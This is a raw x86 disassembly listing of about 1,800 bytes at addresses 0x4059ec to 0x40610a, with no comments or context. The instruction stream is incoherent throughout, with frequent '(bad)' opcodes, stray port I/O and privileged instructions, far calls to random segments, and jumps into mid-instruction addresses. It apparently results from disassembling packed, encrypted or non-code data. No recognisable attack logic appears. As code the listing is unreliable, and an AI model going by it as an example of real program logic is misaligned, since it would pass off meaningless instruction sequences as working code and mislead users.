  4059ec:	jmp    0xc0cd6320
  4059f1:	inc    edx
  4059f2:	mov    ?,WORD PTR [ebx]
  4059f4:	mov    ds:0x81ea933,eax
  4059f9:	pop    esi
  4059fa:	sti    
  4059fb:	pop    edi
  4059fc:	arpl   sp,ax
  4059fe:	hlt    
  4059ff:	xchg   ebx,eax
  405a00:	or     dl,dl
  405a02:	sar    BYTE PTR [ecx+0x7162b212],1
  405a08:	pop    ebx
  405a09:	outs   dx,BYTE PTR ds:[esi]
  405a0a:	ret    0x4db3
  405a0d:	fnstcw WORD PTR [eax]
  405a0f:	push   edx
  405a10:	scas   al,BYTE PTR es:[edi]
  405a11:	jl     0x405a21
  405a13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a14:	and    eax,0xed62b345
  405a19:	add    al,0x7c
  405a1b:	adc    ah,BYTE PTR [esi]
  405a1d:	(bad)  
  405a1e:	cli    
  405a1f:	aas    
  405a20:	sahf   
  405a21:	rcl    edx,cl
  405a23:	sbb    esp,edx
  405a25:	mov    ah,0xb9
  405a27:	push   edi
  405a28:	jmp    0x405a0f
  405a2a:	adc    eax,DWORD PTR [edx+0x40]
  405a2d:	pop    ds
  405a2e:	add    BYTE PTR [edi-0x29],cl
  405a31:	test   ebp,0x36da3fc3
  405a37:	repnz sbb DWORD PTR [ebp-0x14],esi
  405a3b:	cmp    edi,DWORD PTR [edx+0x1cb605eb]
  405a41:	push   edi
  405a42:	pusha  
  405a43:	inc    eax
  405a44:	cmc    
  405a45:	fwait
  405a46:	outs   dx,DWORD PTR ds:[esi]
  405a47:	push   edx
  405a48:	cwde   
  405a49:	jp     0x405a7b
  405a4b:	pop    ecx
  405a4c:	(bad)  
  405a4d:	push   ebx
  405a4e:	add    al,al
  405a50:	mov    al,0x10
  405a52:	rcl    ch,0xaf
  405a55:	jno    0x405a8f
  405a57:	out    dx,al
  405a58:	jo     0x405ad5
  405a5a:	fisttp WORD PTR [ebx]
  405a5c:	and    ecx,DWORD PTR [ecx+0xdca1f03]
  405a62:	lods   al,BYTE PTR ds:[esi]
  405a63:	adc    DWORD PTR fs:[eax-0x50],ebp
  405a67:	mov    eax,ds:0x46509718
  405a6c:	cmp    DWORD PTR [ecx],ecx
  405a6e:	adc    esi,esp
  405a70:	(bad)  
  405a71:	aad    0x91
  405a73:	not    DWORD PTR [edi]
  405a75:	add    eax,0x7cca322b
  405a7a:	fucomp st(1)
  405a7c:	inc    esp
  405a7d:	es push es
  405a7f:	jnp    0x405a5b
  405a81:	fdivr  QWORD PTR [eax+0x4f91afa8]
  405a87:	mov    BYTE PTR [eax-0x4e],bh
  405a8a:	out    dx,al
  405a8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a8d:	cwde   
  405a8e:	inc    ebx
  405a8f:	pop    ebx
  405a90:	sahf   
  405a91:	ret    
  405a92:	jmp    0x405a78
  405a94:	clc    
  405a95:	jno    0x405a36
  405a97:	scas   al,BYTE PTR es:[edi]
  405a98:	ficomp WORD PTR [eax-0x2cf35d22]
  405a9e:	aas    
  405a9f:	pop    ebx
  405aa0:	movlps xmm4,QWORD PTR [edi-0x34]
  405aa4:	inc    edi
  405aa5:	retf   
  405aa6:	push   ebp
  405aa7:	shl    edi,0x6d
  405aaa:	call   0x87ca:0x9dd52026
  405ab1:	sub    dh,bh
  405ab3:	and    esi,DWORD PTR [ecx-0x53]
  405ab6:	cmp    al,0x85
  405ab8:	push   0x5c
  405aba:	xor    al,BYTE PTR [ecx+ecx*8+0x1a]
  405abe:	gs sahf 
  405ac0:	mov    bh,0xe4
  405ac2:	leave  
  405ac3:	or     eax,0x86f21317
  405ac8:	stos   BYTE PTR es:[edi],al
  405ac9:	or     eax,0xb64344ce
  405ace:	dec    ecx
  405acf:	loopne 0x405adc
  405ad1:	je     0x405b2e
  405ad3:	pop    esp
  405ad4:	xchg   ebp,eax
  405ad6:	inc    ebx
  405ad7:	(bad)  
  405ad8:	mov    dl,0x39
  405ada:	pop    ds
  405adb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405adc:	fist   WORD PTR [ebx-0x67]
  405adf:	add    DWORD PTR ds:0x25aba254,edi
  405ae5:	xchg   edi,eax
  405ae6:	inc    esp
  405ae7:	rcl    DWORD PTR [ebx],cl
  405ae9:	mov    al,ds:0x8f1e26ca
  405aee:	pop    ebx
  405aef:	loope  0x405b4e
  405af1:	inc    ecx
  405af2:	dec    eax
  405af3:	push   esp
  405af4:	out    0xef,al
  405af6:	xchg   esp,eax
  405af7:	push   ecx
  405af8:	inc    esp
  405af9:	aam    0xe5
  405afb:	jbe    0x5aae7723
  405b01:	dec    edx
  405b02:	push   cs
  405b03:	push   0xb794ca1e
  405b08:	outs   dx,BYTE PTR ds:[esi]
  405b09:	aas    
  405b0a:	cmp    al,0x57
  405b0c:	mov    DWORD PTR [edi+0x4b],ebp
  405b0f:	adc    BYTE PTR [eax],cl
  405b11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b12:	test   dh,bh
  405b14:	jne    0x405b2d
  405b16:	sub    BYTE PTR [edi],ah
  405b18:	sahf   
  405b19:	sub    DWORD PTR ds:0xefc7a152,0x2ad3243b
  405b23:	mov    DWORD PTR [edx+0x1e997b9b],esp
  405b29:	hlt    
  405b2a:	cmp    al,0xcc
  405b2c:	mov    ah,0x99
  405b2e:	aas    
  405b2f:	xchg   ebp,eax
  405b30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b31:	aad    0xc8
  405b33:	out    dx,al
  405b34:	outs   dx,BYTE PTR ds:[si]
  405b36:	sbb    BYTE PTR [edi-0x44cea6ea],dh
  405b3c:	out    0xd1,eax
  405b3e:	cmp    DWORD PTR ds:0xb90e7ad3,eax
  405b44:	(bad)  
  405b45:	ins    BYTE PTR es:[edi],dx
  405b46:	xor    BYTE PTR [ecx+0x72bc83b1],al
  405b4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b4d:	sbb    dh,BYTE PTR [edx+ebx*2+0x57f47aee]
  405b54:	push   esi
  405b55:	xchg   esp,eax
  405b56:	mov    eax,0x2201640a
  405b5b:	mov    edx,0x96f4a4be
  405b60:	aad    0x95
  405b62:	mov    ecx,0xa6e5afef
  405b67:	sub    eax,0x22e80544
  405b6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b6d:	pop    ds
  405b6e:	mov    eax,0x61c7aac6
  405b73:	in     eax,0xb6
  405b75:	push   eax
  405b76:	pop    esi
  405b77:	jnp    0x405b48
  405b79:	push   esi
  405b7a:	xchg   ebx,eax
  405b7b:	mov    cl,al
  405b7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b7e:	ficom  WORD PTR [esi-0x69f72364]
  405b84:	xchg   DWORD PTR [edx],ecx
  405b86:	test   bh,ch
  405b88:	fld    TBYTE PTR [ecx-0x62]
  405b8b:	push   es
  405b8c:	pop    eax
  405b8d:	jge    0x405b5a
  405b8f:	push   0xdf13aeed
  405b94:	clc    
  405b95:	mov    edx,0x16c93042
  405b9a:	and    al,0xbe
  405b9c:	push   ds
  405b9d:	ins    DWORD PTR es:[edi],dx
  405b9e:	mov    eax,DWORD PTR [esp+eax*2-0x11]
  405ba2:	mov    esi,0x6a5b7c15
  405ba7:	retf   0x2343
  405baa:	iret   
  405bab:	hlt    
  405bac:	cld    
  405bad:	pop    ebp
  405bae:	sub    DWORD PTR [ebx-0x37],esi
  405bb1:	xchg   esp,eax
  405bb2:	pop    ecx
  405bb3:	or     ebx,DWORD PTR [esi+esi*2+0x7d9055fc]
  405bba:	adc    al,0x27
  405bbc:	xor    BYTE PTR [ebx],0xdc
  405bbf:	out    0x31,al
  405bc1:	inc    eax
  405bc2:	jb     0x405bbd
  405bc4:	push   edi
  405bc5:	pusha  
  405bc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405bc7:	out    0xfe,eax
  405bc9:	add    al,0x9b
  405bcb:	push   edi
  405bcc:	jbe    0x405b57
  405bce:	jge    0x405c3d
  405bd0:	pusha  
  405bd1:	pushf  
  405bd2:	mov    ch,BYTE PTR ds:[ebp+0x3d]
  405bd6:	std    
  405bd7:	lods   al,BYTE PTR ds:[esi]
  405bd8:	in     eax,dx
  405bd9:	leave  
  405bda:	cmp    ebx,ebp
  405bdc:	and    ch,BYTE PTR [ebx]
  405bde:	adc    BYTE PTR [edi-0x36],dh
  405be1:	or     BYTE PTR [eax],dh
  405be3:	test   eax,0x8ed879c7
  405be8:	sbb    al,0x2d
  405bea:	dec    esp
  405beb:	fiadd  DWORD PTR [edi]
  405bed:	mov    edx,0x6f843dd6
  405bf2:	jnp    0x405be1
  405bf4:	outs   dx,DWORD PTR ds:[esi]
  405bf5:	fiadd  WORD PTR [esi]
  405bf7:	cmp    bh,ah
  405bf9:	and    al,0x75
  405bfb:	popf   
  405bfc:	add    edi,DWORD PTR [ebx+0x7564b11b]
  405c02:	nop
  405c03:	retf   0x8410
  405c06:	sub    al,0x90
  405c08:	inc    ebp
  405c09:	in     al,0x0
  405c0b:	retf   
  405c0c:	dec    ecx
  405c0d:	pusha  
  405c0e:	fisttp WORD PTR ds:0x337ad038
  405c14:	arpl   WORD PTR [ecx-0x2c78ec5a],bx
  405c1a:	and    al,0xa7
  405c1c:	outs   dx,BYTE PTR ds:[esi]
  405c1d:	inc    esp
  405c1e:	xor    al,0xe6
  405c20:	sub    DWORD PTR [ebp+0x45b929c],ebx
  405c26:	push   esi
  405c27:	jo     0x405c5a
  405c29:	push   edi
  405c2a:	(bad)  
  405c2c:	sti    
  405c2d:	pop    ebx
  405c2e:	jmp    0xc0083563
  405c33:	rcl    DWORD PTR [ebx],cl
  405c35:	stos   BYTE PTR es:[edi],al
  405c36:	sbb    BYTE PTR [esi-0x5bd302de],0xb1
  405c3d:	or     DWORD PTR [edi-0x5f],esi
  405c40:	js     0x405cba
  405c42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c43:	ret    
  405c44:	dec    esi
  405c45:	add    DWORD PTR [ebp+0x10],0xd1536025
  405c4c:	clc    
  405c4d:	dec    edx
  405c4e:	mov    eax,0xb0d706f2
  405c53:	call   0x5d46d156
  405c58:	mov    ah,0x18
  405c5a:	sub    al,0xe2
  405c5c:	mov    dl,0x53
  405c5e:	cmp    BYTE PTR [ecx],dl
  405c60:	mov    dl,BYTE PTR [ebx-0x613eced9]
  405c66:	xchg   esi,eax
  405c67:	test   DWORD PTR [ecx-0x18f5b531],edi
  405c6d:	pop    es
  405c6e:	(bad)  
  405c6f:	pop    edx
  405c70:	loope  0x405ca8
  405c72:	sub    eax,0x7f8ad95
  405c77:	(bad)
  405c7a:	nop
  405c7b:	push   esi
  405c7c:	loope  0x405c4b
  405c7e:	sub    ecx,esi
  405c80:	rcl    DWORD PTR [eax+0x3f276913],1
  405c86:	(bad)  
  405c87:	jnp    0x405c43
  405c89:	pop    ebx
  405c8a:	inc    esi
  405c8b:	xchg   ebp,eax
  405c8c:	push   edi
  405c8d:	dec    edi
  405c8e:	and    dl,BYTE PTR [ecx-0x228e0826]
  405c94:	sub    eax,0x2b986398
  405c99:	push   0xffffff8f
  405c9b:	mov    esi,0x8dd28b3e
  405ca0:	pop    edx
  405ca1:	or     DWORD PTR [esi+0x78],esp
  405ca4:	out    0x4a,al
  405ca6:	popa   
  405ca7:	(bad)  
  405ca8:	or     ebp,eax
  405caa:	aam    0xf3
  405cac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405cad:	jo     0x405cbd
  405caf:	lods   ax,WORD PTR ds:[esi]
  405cb1:	pop    ds
  405cb2:	jne    0x405cbd
  405cb4:	xor    eax,0x642afc6f
  405cb9:	(bad)  
  405cba:	push   edx
  405cbb:	mov    ebx,0xbbbb9cc8
  405cc0:	out    dx,eax
  405cc1:	imul   ecx,DWORD PTR [esi-0x40],0xa30a3b1e
  405cc8:	inc    edi
  405cc9:	mov    DWORD PTR [esi+0x71],0xb56cdccb
  405cd0:	ret    
  405cd1:	mov    esp,0x418c13f2
  405cd6:	arpl   WORD PTR [esp+ebp*4+0x15],bx
  405cda:	fwait
  405cdb:	shl    BYTE PTR ss:[esi-0x1],cl
  405cdf:	add    eax,0xcaa02c4e
  405ce4:	out    0xaa,al
  405ce6:	push   esi
  405ce7:	jp     0x405c92
  405ce9:	add    cl,al
  405ceb:	mov    eax,0xcca39d2d
  405cf0:	(bad)  
  405cf1:	adc    esi,esp
  405cf3:	jne    0x405d1a
  405cf5:	cwde   
  405cf6:	ins    DWORD PTR es:[edi],dx
  405cf7:	imul   edx,DWORD PTR [ebp+0x2915832d],0x62
  405cfe:	cmp    BYTE PTR [ebx],cl
  405d00:	ror    DWORD PTR [ebx-0x1b7512b5],1
  405d06:	stc    
  405d07:	test   eax,0x7e671501
  405d0c:	inc    ebx
  405d0d:	cdq    
  405d0e:	fnsave [ebp-0x2b]
  405d11:	mov    DWORD PTR [ebx+0x69],ebp
  405d14:	xchg   ebp,eax
  405d15:	out    dx,al
  405d16:	adc    DWORD PTR [ecx],esi
  405d18:	dec    ebx
  405d19:	adc    al,0x66
  405d1b:	mov    ch,BYTE PTR ds:0x23cc738b
  405d21:	arpl   WORD PTR [edx],bx
  405d23:	popf   
  405d24:	mov    ch,0xb3
  405d26:	sbb    bl,BYTE PTR [ecx]
  405d28:	out    0xa2,eax
  405d2a:	mov    bl,BYTE PTR [eax]
  405d2c:	inc    esi
  405d2d:	leave  
  405d2e:	push   ebp
  405d2f:	adc    al,0x39
  405d31:	iret   
  405d32:	mov    esi,0x8839f37c
  405d37:	aam    0xdb
  405d39:	mov    ebp,0x7a40dd2b
  405d3e:	es ja  0x405d70
  405d41:	jge    0x405da8
  405d43:	repnz aas 
  405d45:	popa   
  405d46:	sub    dl,dl
  405d48:	cmp    edi,DWORD PTR ds:0xda2bb981
  405d4e:	xchg   sp,ax
  405d50:	out    0x7c,eax
  405d52:	and    al,0xe7
  405d54:	xchg   ecx,eax
  405d55:	adc    BYTE PTR [ecx+0x782f3626],ch
  405d5b:	mov    edi,0x5d8e98b5
  405d60:	js     0x405d47
  405d62:	ret    
  405d63:	cmp    BYTE PTR [ecx],dh
  405d65:	imul   esi,DWORD PTR [ecx+0x43c25f5b],0x16
  405d6c:	lock mov ds:0x2ddf6a88,eax
  405d72:	dec    edx
  405d73:	test   al,0x3b
  405d75:	js     0x405d7c
  405d77:	fidivr WORD PTR [edi-0x2e]
  405d7a:	pop    eax
  405d7b:	enter  0x2a17,0x8b
  405d7f:	sub    dl,bh
  405d81:	jb     0x405d73
  405d83:	xor    bl,al
  405d85:	fild   DWORD PTR [edx+0x67]
  405d88:	nop
  405d89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d8a:	dec    esi
  405d8b:	or     eax,0x18d5bd01
  405d90:	scas   al,BYTE PTR es:[edi]
  405d91:	xchg   esi,eax
  405d92:	loopne 0x405da2
  405d94:	xchg   ecx,eax
  405d95:	fisttp DWORD PTR [ebp-0x1f]
  405d98:	(bad)  
  405d99:	call   FWORD PTR [edx]
  405d9b:	pushf  
  405d9c:	outs   dx,BYTE PTR ds:[esi]
  405d9d:	adc    DWORD PTR [edi+0x65],edi
  405da0:	add    dl,dh
  405da2:	shr    ah,0x2
  405da5:	enter  0xc72b,0xe0
  405da9:	nop
  405daa:	add    BYTE PTR [edi+ecx*4],bh
  405dad:	xchg   BYTE PTR [edi+0x68],ah
  405db0:	xchg   ebx,eax
  405db1:	outs   dx,DWORD PTR ds:[esi]
  405db2:	dec    ebx
  405db3:	lods   al,BYTE PTR ds:[esi]
  405db4:	mov    gs,WORD PTR [ecx]
  405db6:	cmp    al,0x32
  405db8:	add    BYTE PTR [edx-0xa],dh
  405dbb:	into   
  405dbc:	cwde   
  405dbd:	jno    0x405d48
  405dbf:	(bad)  
  405dc0:	cmp    dl,bl
  405dc2:	mov    ds:0xea4a685f,eax
  405dc7:	mov    ah,BYTE PTR [ebx]
  405dc9:	jmp    0xe25a6c1c
  405dce:	push   ebx
  405dcf:	xchg   esp,eax
  405dd0:	aaa    
  405dd1:	fwait
  405dd2:	ins    DWORD PTR es:[edi],dx
  405dd3:	push   ecx
  405dd4:	add    ah,BYTE PTR [edx+0x796725]
  405dda:	mov    dh,0xf9
  405ddc:	daa    
  405ddd:	lods   al,BYTE PTR ds:[esi]
  405dde:	lahf   
  405ddf:	aas    
  405de0:	ds nop
  405de2:	pop    edi
  405de3:	inc    ecx
  405de4:	enter  0x85f3,0xc
  405de8:	scas   al,BYTE PTR es:[edi]
  405de9:	les    edi,FWORD PTR [edi+0x5b]
  405dec:	lock cmp ebp,edx
  405def:	jmp    0x405d98
  405df1:	dec    ecx
  405df2:	push   ds
  405df3:	das    
  405df4:	adc    cl,ah
  405df6:	mov    ebp,0xf852ace7
  405dfb:	stos   DWORD PTR es:[edi],eax
  405dfc:	pop    ebp
  405dfd:	mov    bh,0x1d
  405dff:	pop    edi
  405e00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e01:	sub    al,0x29
  405e03:	mov    ebx,0x9a9907e7
  405e08:	fs push cs
  405e0a:	inc    ebx
  405e0b:	adc    ebx,DWORD PTR [ecx]
  405e0d:	fimul  DWORD PTR [edi]
  405e0f:	pusha  
  405e10:	cmp    DWORD PTR [edi],esi
  405e12:	pop    ebp
  405e13:	mov    dl,0xb2
  405e15:	push   eax
  405e16:	imul   esi,DWORD PTR [ebx+eax*4-0x2],0xffffffe7
  405e1b:	das    
  405e1c:	call   0xb0af:0xfe451e41
  405e23:	inc    edx
  405e24:	xor    al,0xde
  405e26:	loope  0x405de0
  405e28:	mov    ch,0xc7
  405e2a:	aam    0x8
  405e2c:	mov    eax,ds:0x49bf6767
  405e31:	inc    esp
  405e32:	lods   eax,DWORD PTR ds:[esi]
  405e33:	jmp    0x2ee0a1d2
  405e38:	mov    ah,0xd6
  405e3a:	cdq    
  405e3b:	inc    esp
  405e3c:	xor    ebp,DWORD PTR [edx-0x2]
  405e3f:	push   0x4a
  405e41:	cli    
  405e42:	popf   
  405e43:	fnstenv [eax]
  405e45:	(bad)  
  405e46:	cli    
  405e47:	push   esp
  405e48:	xchg   BYTE PTR [ecx-0x360af82],cl
  405e4e:	push   edx
  405e4f:	sub    ah,BYTE PTR [ebx+0x79e5f3f9]
  405e55:	push   edx
  405e56:	cli    
  405e57:	stos   BYTE PTR es:[edi],al
  405e58:	lods   al,BYTE PTR ds:[esi]
  405e59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e5a:	fild   DWORD PTR [esi+ecx*1-0x48b52991]
  405e61:	mov    bh,0x8d
  405e63:	pop    es
  405e64:	shl    BYTE PTR ds:0x39f61310,0x3e
  405e6b:	loopne 0x405eaf
  405e6d:	loop   0x405ead
  405e6f:	xlat   BYTE PTR ds:[ebx]
  405e70:	in     al,0x4e
  405e72:	ret    
  405e73:	xlat   BYTE PTR ds:[ebx]
  405e74:	mov    cl,0x63
  405e76:	push   eax
  405e77:	dec    eax
  405e78:	cmp    eax,0xfa69e858
  405e7d:	repnz or BYTE PTR [ebx+0x3a],dh
  405e81:	inc    ebp
  405e82:	cmp    bl,BYTE PTR [ecx-0x41614df8]
  405e88:	or     BYTE PTR [ebx-0x67],bl
  405e8b:	xchg   ebx,eax
  405e8c:	cmp    DWORD PTR [edx-0x159b9c6e],ebx
  405e92:	das    
  405e93:	mov    ah,0x15
  405e95:	inc    esi
  405e96:	xor    al,0xec
  405e98:	push   edx
  405e99:	(bad)  
  405e9a:	and    DWORD PTR [eax],edi
  405e9c:	jle    0x405e5e
  405e9e:	popa   
  405e9f:	std    
  405ea0:	adc    DWORD PTR [ebx-0x21],edi
  405ea3:	retf   
  405ea4:	ret    
  405ea5:	sti    
  405ea6:	mov    ah,0x5
  405ea8:	lahf   
  405ea9:	aaa    
  405eaa:	sub    BYTE PTR [edx-0x13],bh
  405ead:	xor    ch,al
  405eaf:	pusha  
  405eb0:	cmp    DWORD PTR [ebx],0xffffffdf
  405eb3:	fwait
  405eb4:	sahf   
  405eb5:	xchg   ebx,eax
  405eb6:	xchg   esi,eax
  405eb7:	out    dx,eax
  405eb8:	mov    eax,0x782c4849
  405ebd:	mov    eax,DWORD PTR [eax]
  405ebf:	mov    ecx,0x68997693
  405ec4:	aas    
  405ec5:	icebp  
  405ec6:	icebp  
  405ec7:	inc    ebp
  405ec8:	ret    0x8bd5
  405ecb:	mov    eax,0xe50592b4
  405ed0:	cwde   
  405ed1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ed2:	imul   esi,DWORD PTR [ecx+0x7506666a],0xffffffa4
  405ed9:	je     0x405e81
  405edb:	loopne 0x405ef0
  405edd:	aaa    
  405ede:	mov    ebp,0x805236f
  405ee3:	aaa    
  405ee4:	pop    esp
  405ee5:	adc    ah,cl
  405ee7:	stc    
  405ee8:	lock push esi
  405eea:	pop    ss
  405eeb:	inc    esp
  405eec:	pusha  
  405eed:	sub    al,0x8f
  405eef:	fcmovu st,st(1)
  405ef1:	pop    eax
  405ef2:	arpl   WORD PTR [ebx],ax
  405ef4:	(bad)  
  405ef5:	outs   dx,DWORD PTR ds:[esi]
  405ef6:	pop    ecx
  405ef7:	in     eax,0xdc
  405ef9:	stos   BYTE PTR es:[edi],al
  405efa:	mov    DWORD PTR [ebx],esi
  405efc:	outs   dx,DWORD PTR ds:[esi]
  405efd:	inc    eax
  405efe:	ins    BYTE PTR es:[edi],dx
  405eff:	leave  
  405f00:	scas   al,BYTE PTR es:[edi]
  405f01:	jmp    0x1dd95f46
  405f06:	adc    eax,0xf2de3aee
  405f0b:	sbb    ecx,ecx
  405f0d:	out    dx,eax
  405f0e:	xchg   edx,eax
  405f0f:	fnstcw WORD PTR [ecx-0x23d29ae6]
  405f15:	sbb    DWORD PTR [eax],eax
  405f17:	cdq    
  405f18:	dec    ebx
  405f19:	pusha  
  405f1a:	add    al,0x54
  405f1c:	xchg   esp,eax
  405f1d:	ins    BYTE PTR es:[edi],dx
  405f1e:	pop    esi
  405f1f:	cdq    
  405f20:	mov    esp,0x1e311e5e
  405f25:	retf   0x7cd2
  405f28:	xlat   BYTE PTR ds:[ebx]
  405f29:	jo     0x405f02
  405f2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f2c:	aad    0xb3
  405f2e:	loopne 0x405f67
  405f30:	std    
  405f31:	lds    edi,FWORD PTR [edi+esi*4-0x42]
  405f35:	push   ebp
  405f36:	jnp    0x405f69
  405f38:	enter  0x169a,0x82
  405f3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f3d:	xchg   DWORD PTR [ecx],esi
  405f3f:	sub    BYTE PTR [eax+ebx*8+0x2716069a],dl
  405f46:	xchg   edx,eax
  405f47:	shl    DWORD PTR [eax+0x7e],cl
  405f4a:	dec    edi
  405f4b:	jne    0x405f03
  405f4d:	test   ebp,ebp
  405f4f:	call   0xfba4:0x8d7baa0b
  405f56:	inc    esi
  405f57:	outs   dx,BYTE PTR ds:[esi]
  405f58:	mov    al,0x77
  405f5a:	dec    ecx
  405f5b:	cmp    cl,BYTE PTR [edi-0x1de19808]
  405f61:	out    0xe1,eax
  405f63:	and    BYTE PTR [esi+0x712090a6],al
  405f69:	sbb    DWORD PTR [eax+0x163212c3],ecx
  405f6f:	cmp    eax,0x233b89bd
  405f74:	aam    0xab
  405f76:	cdq    
  405f77:	call   FWORD PTR [eax]
  405f79:	shl    BYTE PTR [ebp-0x30],cl
  405f7c:	push   ds
  405f7d:	test   eax,0x82a4d3f8
  405f82:	rcr    BYTE PTR [eax+eax*8-0x5],0x23
  405f87:	cld    
  405f88:	cdq    
  405f89:	mov    ebp,DWORD PTR [edx-0x13]
  405f8c:	rcr    DWORD PTR [ecx],0xe9
  405f8f:	cld    
  405f90:	pusha  
  405f91:	pop    edi
  405f92:	jno    0x405fc4
  405f94:	imul   esp,DWORD PTR [ebx],0x27
  405f97:	and    edx,eax
  405f99:	inc    ecx
  405f9a:	sti    
  405f9b:	test   edi,ebx
  405f9d:	dec    esi
  405f9e:	sti    
  405f9f:	inc    eax
  405fa0:	int3   
  405fa1:	push   ebp
  405fa2:	lea    edx,[eax+0x1d286e92]
  405fa8:	out    dx,al
  405fa9:	out    dx,eax
  405faa:	icebp  
  405fab:	mov    al,ds:0x50d95512
  405fb0:	add    ecx,ecx
  405fb2:	dec    ebp
  405fb3:	and    ebx,DWORD PTR [edx+0x4e]
  405fb6:	sub    edx,DWORD PTR ds:0xa53f3908
  405fbc:	lods   eax,DWORD PTR ds:[esi]
  405fbd:	in     al,0x82
  405fbf:	stos   DWORD PTR es:[edi],eax
  405fc0:	mov    dh,0xc9
  405fc2:	xor    ebx,DWORD PTR [ebx+0x510f15c0]
  405fc8:	test   DWORD PTR [esi+0x39],ebp
  405fcb:	call   0xc396:0xf8e17f63
  405fd2:	outs   dx,BYTE PTR ds:[esi]
  405fd3:	lods   eax,DWORD PTR ds:[esi]
  405fd4:	jbe    0x406030
  405fd6:	and    BYTE PTR [edx-0x53b32e74],dl
  405fdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405fdd:	pop    ebp
  405fde:	or     DWORD PTR [edi-0x26a1622c],esi
  405fe4:	or     DWORD PTR [esi],ebx
  405fe6:	aas    
  405fe7:	pop    ebp
  405fe8:	push   ecx
  405fe9:	je     0x405faf
  405feb:	dec    eax
  405fec:	jmp    0xe4fa:0x9e85eef1
  405ff3:	mov    al,ds:0x6b23ad77
  405ff8:	xor    DWORD PTR [ebx-0x66],ebp
  405ffb:	das    
  405ffc:	gs hlt 
  405ffe:	daa    
  405fff:	dec    edi
  406000:	jg     0x405fd3
  406002:	xchg   ecx,eax
  406003:	shr    DWORD PTR [edi-0x4df9eb20],cl
  406009:	mov    bl,0x28
  40600b:	popa   
  40600c:	push   es
  40600d:	pusha  
  40600e:	xchg   edx,eax
  40600f:	adc    eax,0x62b6d855
  406014:	popa   
  406015:	pop    esp
  406016:	xchg   ecx,eax
  406017:	sub    BYTE PTR [ebx+0x7e],dl
  40601a:	aad    0x57
  40601c:	or     al,0x41
  40601e:	loop   0x406012
  406020:	shr    DWORD PTR [esi-0x4da0599c],1
  406026:	xchg   ecx,eax
  406027:	stos   BYTE PTR es:[edi],al
  406028:	and    BYTE PTR cs:[ebx],cl
  40602b:	xchg   BYTE PTR [eax],cl
  40602d:	and    eax,0x196a64aa
  406032:	jno    0x405ff8
  406034:	or     BYTE PTR [esi-0x48cfcd81],ah
  40603a:	cmp    BYTE PTR ds:0x6742c18b,ch
  406040:	jmp    0x47c9:0xb0a8091e
  406047:	jns    0x40604b
  406049:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40604a:	cmp    ah,BYTE PTR [esi-0x11108d7f]
  406050:	sub    eax,0x28d174e2
  406055:	or     DWORD PTR ds:0xcafc8d67,ebp
  40605b:	leave  
  40605c:	adc    eax,0x1d222a59
  406061:	or     al,0xeb
  406063:	xor    ebx,0x5f6857d9
  406069:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40606a:	fidiv  WORD PTR [edi]
  40606c:	xchg   edx,eax
  40606d:	pop    es
  40606e:	push   es
  40606f:	inc    esi
  406070:	cld    
  406071:	jl     0x40609c
  406073:	ror    BYTE PTR fs:[ebp+0x1c],cl
  406077:	xor    esp,DWORD PTR [ecx]
  406079:	pop    ebp
  40607a:	push   edx
  40607b:	mov    ds:0x9d71626c,eax
  406080:	xlat   BYTE PTR ds:[ebx]
  406081:	lds    ecx,FWORD PTR [ebx-0x443fc0d5]
  406087:	jne    0x4060c7
  406089:	out    0x93,eax
  40608b:	xor    al,0x82
  40608d:	mov    ?,WORD PTR [eax+esi*4-0x42]
  406091:	mov    eax,ds:0x54c2f444
  406096:	xor    BYTE PTR [eax],0xf
  406099:	or     dl,BYTE PTR [eax+0x61]
  40609c:	in     eax,dx
  40609d:	sbb    eax,0x92841e32
  4060a2:	in     al,0xca
  4060a4:	xor    eax,0x1292ca45
  4060a9:	leave  
  4060aa:	inc    edi
  4060ab:	xchg   ebx,eax
  4060ac:	push   ecx
  4060ad:	xor    al,0x91
  4060af:	je     0x406107
  4060b1:	mov    ds:0x929ba7f5,eax
  4060b6:	(bad)  
  4060b7:	int    0xe
  4060b9:	jl     0x406086
  4060bb:	inc    esi
  4060bc:	adc    BYTE PTR [ebx+0x30054943],cl
  4060c2:	jle    0x4060ff
  4060c4:	pop    ebp
  4060c5:	push   0x4e
  4060c7:	aas    
  4060c8:	icebp  
  4060c9:	dec    esi
  4060ca:	aas    
  4060cb:	mov    bl,0xf1
  4060cd:	lahf   
  4060ce:	mov    bl,0x94
  4060d0:	fdivr  QWORD PTR [edx-0x3347f717]
  4060d6:	dec    edx
  4060d7:	or     esp,edx
  4060d9:	or     al,0x29
  4060db:	fwait
  4060dc:	push   ebx
  4060dd:	inc    eax
  4060de:	loope  0x40612b
  4060e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060e1:	fdiv   st(4),st
  4060e3:	xchg   esp,eax
  4060e4:	adc    al,0xf5
  4060e6:	and    eax,0x7e6b89a2
  4060eb:	xlat   BYTE PTR ds:[ebx]
  4060ec:	and    DWORD PTR [ebp-0x3f],eax
  4060ef:	xor    DWORD PTR [esi+0x57db7e5c],ebx
  4060f5:	retf   
  4060f6:	add    al,0xe5
  4060f8:	lods   eax,DWORD PTR ds:[esi]
  4060f9:	inc    di
  4060fb:	and    eax,0x47a5ed7a
  406100:	mov    ebp,0x36a7e06b
  406105:	stc    
  406106:	inc    esi
  406107:	sub    BYTE PTR [eax+0x71],bl
  40610a:	sar    dl,1
